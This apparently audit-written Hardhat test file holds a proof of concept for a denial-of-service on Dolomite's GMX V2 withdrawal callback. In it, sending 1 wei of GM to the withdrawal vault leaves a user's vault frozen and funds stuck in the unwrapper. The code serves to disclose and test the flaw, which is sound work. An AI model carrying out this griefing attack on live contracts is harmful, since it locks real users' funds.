import { mine } from "@nomicfoundation/hardhat-network-helpers";
import { ZERO_ADDRESS } from "@openzeppelin/upgrades/lib/utils/Addresses";
import { expect } from "chai";
import { BigNumber, BigNumberish, ethers } from "ethers";
import { defaultAbiCoder, parseEther } from "ethers/lib/utils";
import {
  EventEmitterRegistry,
  GmxV2IsolationModeUnwrapperTraderV2,
  GmxV2IsolationModeVaultFactory,
  GmxV2IsolationModeWrapperTraderV2,
  GmxV2MarketTokenPriceOracle,
  GmxV2Registry,
  IERC20,
  IGmxMarketToken,
  TestGmxV2IsolationModeTokenVaultV1,
  TestGmxV2IsolationModeTokenVaultV1__factory,
  TestGmxV2IsolationModeUnwrapperTraderV2,
} from "src/types";
import { depositIntoDolomiteMargin } from "src/utils/dolomite-utils";
import {
  BYTES_EMPTY,
  MAX_UINT_256_BI,
  ONE_BI,
  ONE_ETH_BI,
  ZERO_BI,
} from "src/utils/no-deps-constants";
import {
  impersonate,
  revertToSnapshotAndCapture,
  setEtherBalance,
  snapshot,
} from "test/utils";
import {
  expectEvent,
  expectProtocolBalance,
  expectProtocolBalanceIsGreaterThan,
  expectThrow,
  expectWalletBalance,
} from "test/utils/assertions";
import {
  createGmxV2IsolationModeVaultFactory,
  createGmxV2IsolationModeWrapperTraderV2,
  createGmxV2Library,
  createGmxV2MarketTokenPriceOracle,
  createGmxV2Registry,
  createTestGmxV2IsolationModeTokenVaultV1,
  createTestGmxV2IsolationModeUnwrapperTraderV2,
  getOracleParams,
  getWithdrawalObject,
} from "test/utils/ecosystem-token-utils/gmx";
import {
  CoreProtocol,
  disableInterestAccrual,
  getDefaultCoreProtocolConfigForGmxV2,
  setupCoreProtocol,
  setupGMBalance,
  setupNativeUSDCBalance,
  setupTestMarket,
  setupUserVaultProxy,
  setupWETHBalance,
} from "test/utils/setup";
import {
  GMX_V2_CALLBACK_GAS_LIMIT,
  GMX_V2_EXECUTION_FEE,
} from "../../../src/utils/constructors/gmx";
import {
  createDolomiteRegistryImplementation,
  createEventEmitter,
} from "../../utils/dolomite";
import { createSafeDelegateLibrary } from "../../utils/ecosystem-token-utils/general";

enum ReversionType {
  None = 0,
  Assert = 1,
  Require = 2,
}

const defaultAccountNumber = "0";
const borrowAccountNumber = "123";
const DUMMY_WITHDRAWAL_KEY =
  "0x6d1ff6ffcab884211992a9d6b8261b7fae5db4d2da3a5eb58647988da3869d6f";
const usdcAmount = BigNumber.from("1000000000"); // $1000
const amountWei = parseEther("10");

enum UnwrapTradeType {
  ForWithdrawal = 0,
  ForDeposit = 1,
}

function encodeWithdrawalKey(tradeType: UnwrapTradeType, key: string): string {
  return ethers.utils.defaultAbiCoder.encode(
    ["uint8[]", "bytes32[]"],
    [[tradeType], [key]]
  );
}

function encodeWithdrawalKeyForCallFunction(
  transferAmount: BigNumberish,
  tradeType: UnwrapTradeType,
  key: string
): string {
  return ethers.utils.defaultAbiCoder.encode(
    ["uint256", "uint8[]", "bytes32[]"],
    [transferAmount, [tradeType], [key]]
  );
}

describe.only("Guardian:: Callback DoS PoC", () => {
  let snapshotId: string;

  let core: CoreProtocol;
  let underlyingToken: IGmxMarketToken;
  let allowableMarketIds: BigNumberish[];
  let gmxV2Registry: GmxV2Registry;
  let unwrapper: TestGmxV2IsolationModeUnwrapperTraderV2;
  let wrapper: GmxV2IsolationModeWrapperTraderV2;
  let factory: GmxV2IsolationModeVaultFactory;
  let vault: TestGmxV2IsolationModeTokenVaultV1;
  let vault2: TestGmxV2IsolationModeTokenVaultV1;
  let priceOracle: GmxV2MarketTokenPriceOracle;
  let eventEmitter: EventEmitterRegistry;
  let marketId: BigNumber;

  before(async () => {
    core = await setupCoreProtocol(getDefaultCoreProtocolConfigForGmxV2());
    underlyingToken = core.gmxEcosystemV2!.gmxEthUsdMarketToken.connect(
      core.hhUser1
    );
    const gmxV2Library = await createGmxV2Library();
    const safeDelegateCallLibrary = await createSafeDelegateLibrary();
    const userVaultImplementation =
      await createTestGmxV2IsolationModeTokenVaultV1(core);
    gmxV2Registry = await createGmxV2Registry(core, GMX_V2_CALLBACK_GAS_LIMIT);

    allowableMarketIds = [core.marketIds.nativeUsdc!, core.marketIds.weth];
    factory = await createGmxV2IsolationModeVaultFactory(
      core,
      gmxV2Library,
      gmxV2Registry,
      allowableMarketIds,
      allowableMarketIds,
      core.gmxEcosystemV2!.gmxEthUsdMarketToken,
      userVaultImplementation
    );
    wrapper = await createGmxV2IsolationModeWrapperTraderV2(
      core,
      factory,
      gmxV2Library,
      gmxV2Registry
    );
    unwrapper = await createTestGmxV2IsolationModeUnwrapperTraderV2(
      core,
      factory,
      gmxV2Library,
      safeDelegateCallLibrary,
      gmxV2Registry
    );
    priceOracle = await createGmxV2MarketTokenPriceOracle(core, gmxV2Registry);
    await priceOracle
      .connect(core.governance)
      .ownerSetMarketToken(factory.address, true);
    marketId = await core.dolomiteMargin.getNumMarkets();
    await setupTestMarket(core, factory, true, priceOracle);

    await disableInterestAccrual(core, core.marketIds.weth);
    await disableInterestAccrual(core, core.marketIds.nativeUsdc!);

    await factory
      .connect(core.governance)
      .ownerInitialize([unwrapper.address, wrapper.address]);
    await core.dolomiteMargin
      .connect(core.governance)
      .ownerSetGlobalOperator(factory.address, true);

    await factory.createVault(core.hhUser1.address);
    await factory.createVault(core.hhUser2.address);
    const vaultAddress = await factory.getVaultByAccount(core.hhUser1.address);
    const vaultAddress2 = await factory.getVaultByAccount(core.hhUser2.address);
    vault = setupUserVaultProxy<TestGmxV2IsolationModeTokenVaultV1>(
      vaultAddress,
      TestGmxV2IsolationModeTokenVaultV1__factory,
      core.hhUser1
    );
    vault2 = setupUserVaultProxy<TestGmxV2IsolationModeTokenVaultV1>(
      vaultAddress2,
      TestGmxV2IsolationModeTokenVaultV1__factory,
      core.hhUser2
    );

    await setupWETHBalance(core, core.hhUser1, ONE_ETH_BI, core.dolomiteMargin);
    await depositIntoDolomiteMargin(
      core,
      core.hhUser1,
      defaultAccountNumber,
      core.marketIds.weth,
      ONE_ETH_BI
    );

    await setupNativeUSDCBalance(
      core,
      core.hhUser1,
      usdcAmount,
      core.dolomiteMargin
    );
    await depositIntoDolomiteMargin(
      core,
      core.hhUser1,
      defaultAccountNumber,
      core.marketIds.nativeUsdc!,
      usdcAmount
    );
    await setEtherBalance(
      core.gmxEcosystemV2!.gmxExecutor.address,
      parseEther("100")
    );

    await gmxV2Registry
      .connect(core.governance)
      .ownerSetUnwrapperByToken(factory.address, unwrapper.address);
    await gmxV2Registry
      .connect(core.governance)
      .ownerSetWrapperByToken(factory.address, wrapper.address);

    eventEmitter = await createEventEmitter(core);
    const newRegistry = await createDolomiteRegistryImplementation();
    await core.dolomiteRegistryProxy
      .connect(core.governance)
      .upgradeTo(newRegistry.address);
    await core.dolomiteRegistry
      .connect(core.governance)
      .ownerSetEventEmitter(eventEmitter.address);

    snapshotId = await snapshot();
  });

  beforeEach(async () => {
    snapshotId = await revertToSnapshotAndCapture(snapshotId);
  });

  let withdrawalKey: string;

  async function setupBalances(outputToken: IERC20) {
    await setupGMBalance(core, core.hhUser1, amountWei, vault);
    await vault.depositIntoVaultForDolomiteMargin(
      defaultAccountNumber,
      amountWei
    );
    await vault.openBorrowPosition(
      defaultAccountNumber,
      borrowAccountNumber,
      amountWei,
      { value: GMX_V2_EXECUTION_FEE }
    );
    await expectProtocolBalance(
      core,
      vault.address,
      borrowAccountNumber,
      marketId,
      amountWei
    );
    await expectWalletBalance(vault, underlyingToken, amountWei);
    expect(await vault.isVaultAccountFrozen(defaultAccountNumber)).to.eq(false);
    expect(await vault.isVaultAccountFrozen(borrowAccountNumber)).to.eq(false);

    const minAmountOut = ONE_BI;
    await vault.initiateUnwrapping(
      borrowAccountNumber,
      amountWei,
      outputToken.address,
      minAmountOut,
      { value: parseEther("0.01") }
    );
    await expectWalletBalance(vault, underlyingToken, ZERO_BI);

    const filter = eventEmitter.filters.AsyncWithdrawalCreated();
    withdrawalKey = (await eventEmitter.queryFilter(filter))[0].args.key;
    const withdrawal = await unwrapper.getWithdrawalInfo(withdrawalKey);
    expect(withdrawal.key).to.eq(withdrawalKey);
    expect(withdrawal.vault).to.eq(vault.address);
    expect(withdrawal.accountNumber).to.eq(borrowAccountNumber);
    expect(withdrawal.inputAmount).to.eq(amountWei);
    expect(withdrawal.outputToken).to.eq(outputToken.address);
    expect(withdrawal.outputAmount).to.eq(minAmountOut);

    await expectProtocolBalance(
      core,
      vault.address,
      borrowAccountNumber,
      marketId,
      amountWei
    );
    await expectProtocolBalance(
      core,
      vault.address,
      borrowAccountNumber,
      core.marketIds.weth,
      0
    );
    expect(await vault.isVaultAccountFrozen(defaultAccountNumber)).to.eq(false);
    expect(await vault.isVaultAccountFrozen(borrowAccountNumber)).to.eq(true);
    expect(await vault.isVaultFrozen()).to.eq(true);
    expect(await vault.shouldSkipTransfer()).to.eq(false);
    expect(await vault.isDepositSourceWrapper()).to.eq(false);
    expect(await underlyingToken.balanceOf(vault.address)).to.eq(ZERO_BI);
  }

  it.only("Send 1 Wei to Withdrawal Vault to Revert On afterWithdrawalExecution Validation", async () => {
    // Send 1 wei of GM to withdrawal vault prior to initiating a withdrawal
    await setupGMBalance(core, core.gmxEcosystemV2?.gmxWithdrawalVault!, 1);
    // A withdrawal for amountWei + 1 is created
    await setupBalances(core.tokens.nativeUsdc!);
    // The protocol has amountWei GM prior to withdrawal execution
    await expectProtocolBalance(
      core,
      vault.address,
      borrowAccountNumber,
      marketId,
      amountWei
    );
    // There is no USDC in the Unwrapper
    expect(await core.tokens.nativeUsdc!.balanceOf(unwrapper.address)).to.eq(0);

    const result = await core
      .gmxEcosystemV2!.gmxWithdrawalHandler.connect(
        core.gmxEcosystemV2!.gmxExecutor
      )
      .executeWithdrawal(
        withdrawalKey,
        getOracleParams(
          core.tokens.weth.address,
          core.tokens.nativeUsdc!.address
        ),
        { gasLimit: 10_000_000 }
      );

    // Withdrawal info object remains and is uncleared
    const withdrawal = await unwrapper.getWithdrawalInfo(withdrawalKey);
    expect(withdrawal.key).to.eq(withdrawalKey);
    expect(withdrawal.vault).to.eq(vault.address);
    expect(withdrawal.accountNumber).to.eq(borrowAccountNumber);
    expect(withdrawal.inputAmount).to.eq(amountWei);
    expect(withdrawal.outputToken).to.eq(core.tokens.nativeUsdc!.address);
    expect(withdrawal.outputAmount).to.eq(ONE_BI);

    // The protocol STILL has amountWei GM after withdrawal execution
    await expectProtocolBalance(
      core,
      vault.address,
      borrowAccountNumber,
      marketId,
      amountWei
    );
    await expectProtocolBalance(
      core,
      vault.address,
      borrowAccountNumber,
      core.marketIds.weth,
      ZERO_BI
    );
    await expectProtocolBalance(
      core,
      vault.address,
      borrowAccountNumber,
      core.marketIds.nativeUsdc!,
      ZERO_BI
    );

    // Vault remains frozen, prohibiting user actions
    expect(await vault.isVaultFrozen()).to.eq(true);
    expect(await vault.shouldSkipTransfer()).to.eq(false);
    expect(await vault.isDepositSourceWrapper()).to.eq(false);
    expect(await underlyingToken.balanceOf(vault.address)).to.eq(ZERO_BI);

    // Funds are stuck in the Unwrapper
    expect(await core.tokens.nativeUsdc!.balanceOf(unwrapper.address)).to.be.gt(0);
  });
});
